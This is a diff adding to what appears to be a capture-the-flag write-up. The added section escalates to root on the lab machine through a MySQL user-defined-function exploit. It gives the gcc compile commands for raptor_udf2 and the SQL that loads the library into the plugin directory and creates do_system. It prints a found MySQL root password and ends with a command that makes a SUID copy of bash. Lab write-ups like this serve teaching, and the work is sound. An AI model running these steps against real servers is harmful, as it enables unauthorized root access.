@@ -262,27 +262,105 @@ And do the same thing as we did with POC payload:
 
 ![obraz](https://github.com/user-attachments/assets/6f1598b8-84de-4722-b815-ae629ea7f607)
 
+Lastly retrieve a flag:  
+
+![obraz](https://github.com/user-attachments/assets/e1bf3e38-c30d-4e97-b84f-c8891c0751a8)
 
 
 
 ## Priv Esc to root
 
+If we run ps aux it only shows processes owned by svc.  
 
+![obraz](https://github.com/user-attachments/assets/ee14891a-b5ea-4ab8-a1d1-a642506d6e15)
 
+It happens because /etc/fstab has hidepid=2, so ps will not show processes of other users.    
 
+We can check services:  
+```
+cd /etc/systemd
+find . -name '*.service'
+```
+Let's check mysql service:  
+```
+cat ./system/mysql-start.service
+```
 
+I'll paste it here:  
+```
+[Unit]
+Description=MySQL service
 
+[Service]
+ExecStart=/usr/sbin/mysqld
+User=root
+Group=root
 
+[Install]
+WantedBy=multi-user.target
+```
 
+We now know that mysql runs as user root instead of user mysql.  
+It's a dangerous configuration.  
 
+After quick search for exploit I found:  
+```
+https://www.exploit-db.com/exploits/1518
+```
 
+We need to compile it:  
+```
+gcc -g -c raptor.c
+gcc -g -shared -Wl,-soname,raptor.so -o raptor.so raptor.o -lc
+```
+![obraz](https://github.com/user-attachments/assets/529c734e-f519-4426-b178-caa17de39e02)
 
+I was stuck here for a while and then noticed that we had second application backup.  
+I checked it and found mysql root password:  
++  root:Nildogg36
 
+![obraz](https://github.com/user-attachments/assets/1184bbcd-109e-450e-9864-324d3924f780)
 
+I followed this article to exploit this vulnerability:  
+```
+https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf
+```
 
+After logging into mysql we need to run:  
+```
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/home/svc/raptor_udf2.so'));
+```
 
+Now locate plugins directory:  
+```
+show variables like '%plugin%';
+```
 
+Then we run:  
+```
+select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+select * from mysql.func;
+```
 
+Now we should be able to run commands, we will copy /bin/bash to /tmp and add SUID bit:  
+```
+select do_system('cp /bin/bash /tmp/bash; chmod 4777 /tmp/bash');
+```
+
+The whole exploitation can be seen on screenshot below:  
+
+![obraz](https://github.com/user-attachments/assets/d66473d6-be88-43f6-9bbb-c4bccfb8415f)
+
+![obraz](https://github.com/user-attachments/assets/23eb65c9-7899-46a1-b4c4-2fb04f334fdd)
+
+Now we can use our copy of /bin/bash and escalate to root:  
+
+![obraz](https://github.com/user-attachments/assets/2ec39234-5dcd-4b6d-b7e7-ed7019b47b90)
+
+Thanks for reading!  
 
 
 
